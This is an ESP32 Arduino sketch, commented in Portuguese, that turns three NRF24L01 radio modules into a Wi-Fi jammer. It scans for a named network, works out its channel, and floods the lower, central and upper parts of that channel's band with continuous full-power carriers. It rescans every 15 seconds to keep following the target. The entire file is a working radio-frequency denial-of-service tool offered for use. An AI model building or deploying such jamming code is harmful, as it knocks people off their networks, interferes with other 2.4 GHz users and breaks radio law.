/*
 * Código para usar um ESP32 com três módulos NRF24L01
 * para encontrar o canal de uma rede Wi-Fi e saturar sua largura de banda.
 *
 * Estratégia: O ESP32 descobre o canal Wi-Fi alvo. Em vez de atacar
 * apenas a frequência central, ele distribui os três módulos NRF24L01
 * para atacar as partes inferior, central e superior da banda de 20MHz
 * do canal, maximizando a interferência.
 *
 */

#include <SPI.h>
#include <nRF24L01.h>
#include <RF24.h>
#include "WiFi.h" // Biblioteca para usar o Wi-Fi do ESP32

// --- CONFIGURAÇÃO DO ALVO ---
// !!! IMPORTANTE: Altere para o nome exato da sua rede Wi-Fi !!!
const char* targetSsid = "Bernardo.2G";
const int SPREAD = 6; // Espaçamento em MHz do centro (6MHz para cada lado cobre bem a banda)

// --- PINAGEM DOS RÁDIOS E LEDs ---
const int pinoCE1 = 4, pinoCSN1 = 5, ledPin1 = 13;
const int pinoCE2 = 26, pinoCSN2 = 27, ledPin2 = 12;
const int pinoCE3 = 32, pinoCSN3 = 33, ledPin3 = 14;

// --- INSTÂNCIAS DOS RÁDIOS ---
RF24 radio1(pinoCE1, pinoCSN1);
RF24 radio2(pinoCE2, pinoCSN2);
RF24 radio3(pinoCE3, pinoCSN3);

// --- VARIÁVEIS DE CONTROLE ---
byte currentTargetCenterChannel = 0;
unsigned long lastScanTime = 0;
const long scanInterval = 15000; // Escaneia a cada 15 segundos

// Função para configurar um rádio e seu LED de status
void configurarRadio(RF24 &radio, int ledPin, const char* nomeRadio) {
  Serial.print("Configurando ");
  Serial.println(nomeRadio);
  if (radio.begin()) {
    radio.setDataRate(RF24_2MBPS);
    radio.setPALevel(RF24_PA_MAX);
    radio.setAutoAck(false);
    radio.setRetries(0, 0);
    digitalWrite(ledPin, HIGH);
    Serial.print(nomeRadio);
    Serial.println(" configurado. LED LIGADO.");
  } else {
    digitalWrite(ledPin, LOW);
    Serial.print("Falha ao iniciar o ");
    Serial.println(nomeRadio);
  }
}

// Função para escanear o Wi-Fi e definir os canais de ataque
bool findAndSetTargetChannels() {
  Serial.print("Escaneando por '");
  Serial.print(targetSsid);
  Serial.println("'...");
  
  int n = WiFi.scanNetworks();
  if (n == 0) {
    Serial.println("Nenhuma rede encontrada.");
    return false;
  }

  for (int i = 0; i < n; ++i) {
    if (WiFi.SSID(i) == targetSsid) {
      byte wifiChannel = WiFi.channel(i);
      // Converte o canal Wi-Fi (1-13) para o canal NRF central (0-125)
      // Fórmula: Freq = 2400 + NRF_Canal | Freq_WiFi = 2407 + 5 * WiFi_Canal
      byte nrfCenterChannel = (wifiChannel - 1) * 5 + 12;
      
      Serial.print("Alvo encontrado! Canal Wi-Fi: ");
      Serial.print(wifiChannel);
      Serial.print(" (Frequência central NRF: ");
      Serial.print(nrfCenterChannel);
      Serial.println(")");
      
      if (nrfCenterChannel != currentTargetCenterChannel) {
        Serial.println("Canal mudou ou é a primeira varredura. Atualizando rádios...");
        currentTargetCenterChannel = nrfCenterChannel;
        
        byte target1 = nrfCenterChannel - SPREAD;
        byte target2 = nrfCenterChannel;
        byte target3 = nrfCenterChannel + SPREAD;

        radio1.setChannel(target1);
        radio2.setChannel(target2);
        radio3.setChannel(target3);
        
        Serial.print("Rádio 1 (Banda Baixa) no canal NRF: "); Serial.println(target1);
        Serial.print("Rádio 2 (Banda Central) no canal NRF: "); Serial.println(target2);
        Serial.print("Rádio 3 (Banda Alta) no canal NRF: "); Serial.println(target3);
      } else {
        Serial.println("Canal permanece o mesmo. Nenhuma atualização necessária.");
      }
      return true;
    }
  }

  Serial.println("Rede alvo não encontrada nesta varredura.");
  return false;
}

void setup() {
  Serial.begin(115200);
  while (!Serial);
  Serial.println("--- Ataque de Saturação de Banda com 3x NRF24L01 ---");

  // Configura os LEDs
  pinMode(ledPin1, OUTPUT); pinMode(ledPin2, OUTPUT); pinMode(ledPin3, OUTPUT);
  digitalWrite(ledPin1, LOW); digitalWrite(ledPin2, LOW); digitalWrite(ledPin3, LOW);

  // Configura os rádios NRF24L01
  configurarRadio(radio1, ledPin1, "Radio 1");
  configurarRadio(radio2, ledPin2, "Radio 2");
  configurarRadio(radio3, ledPin3, "Radio 3");

  // Configura o Wi-Fi do ESP32 para modo de escaneamento
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  delay(100);

  // Faz a primeira busca e inicia a transmissão
  if (findAndSetTargetChannels()) {
    Serial.println("Iniciando transmissão de portadora contínua...");
    radio1.startConstCarrier(RF24_PA_MAX, currentTargetCenterChannel - SPREAD);
    radio2.startConstCarrier(RF24_PA_MAX, currentTargetCenterChannel);
    radio3.startConstCarrier(RF24_PA_MAX, currentTargetCenterChannel + SPREAD);
  } else {
    Serial.println("Alvo não encontrado na primeira busca. Tente novamente.");
  }
  
  Serial.println("----------------------------------------");
}

void loop() {
  // Verifica se já é hora de escanear novamente
  if (millis() - lastScanTime > scanInterval) {
    lastScanTime = millis();
    findAndSetTargetChannels();
    Serial.println("----------------------------------------");
  }
}
